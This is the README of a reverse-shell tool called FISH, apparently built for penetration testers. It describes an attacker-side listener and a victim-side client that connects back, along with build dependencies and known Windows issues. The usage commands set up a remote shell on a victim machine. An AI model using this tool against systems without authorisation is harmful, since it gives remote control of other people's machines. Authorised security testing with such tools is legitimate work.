# FISH - Fully Interactive SHell
Get a fully-ish interactive reverse shell when performing penetration tests. I got sick of using dumb reverse shells and hitting `ctrl+c`, especially on a windows vicitim machine.

## Usage
In the attacker machine, launch the server executable with a specified host and port to listen for incoming requests.
```shell
$ server <bind_address> <bind_port>
```

In the victim machine, launch the client executable (both unix and windows version are available). 
```shell
$ client <server_address> <server_port>
```

[![asciicast](https://asciinema.org/a/sdGg38QO0R850KnJjzYA6iv5J.svg)](https://asciinema.org/a/sdGg38QO0R850KnJjzYA6iv5J)

## Build
This tool should be compiled on a unix machine and it is dependant on the following packages.
Just run `make` after installing the dependencies.

### Dependencies
* C++ Compiler : `g++`
* C++ Cross Compiler (Win32) : `g++-mingw-w64-i686-win32`
* C++ Cross Compiler (i386) : `g++-multilib`
* Make build tools : `make`
* [Winpty](https://github.com/rprichard/winpty) and [Mongoose](https://github.com/cesanta/mongoose) (included in this repo)

## Known issues
* Windows child pty does not have the same privileges in some cases
* Windows 10 does not support Crtl+C on child processes (Maybe use conpty as an alternative)

## To be done
* Install Winpty and Mongoose as a dependencies (From Git from example)

# Disclaimer
It goes without saying that this tool is intended to be used for educational and/or ethical purposes. 